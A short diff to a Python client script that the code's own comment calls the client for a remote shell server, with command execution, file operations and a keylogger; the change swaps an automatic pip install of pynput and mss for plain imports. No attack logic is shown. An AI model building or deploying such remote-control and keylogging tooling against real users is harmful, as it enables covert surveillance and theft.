@@ -5,21 +5,14 @@
 # This script serves as the client-side counterpart to the Remote Shell server. It connects to the server
 # and allows the execution of commands, file operations, and includes a keylogger feature.
 
-
-try:
-    import socket
-    import threading
-    import time
-    import json
-    import subprocess
-    import os
-    import mss
-    from pynput import keyboard
-except ModuleNotFoundError:
-    from subprocess import call
-
-    modules = ["pynput", "mss"]
-    call("pip install " + ' '.join(modules), shell=True)
+import socket
+import threading
+import time
+import json
+import subprocess
+import os
+import mss
+from pynput import keyboard
 
 
 class RemoteControl:
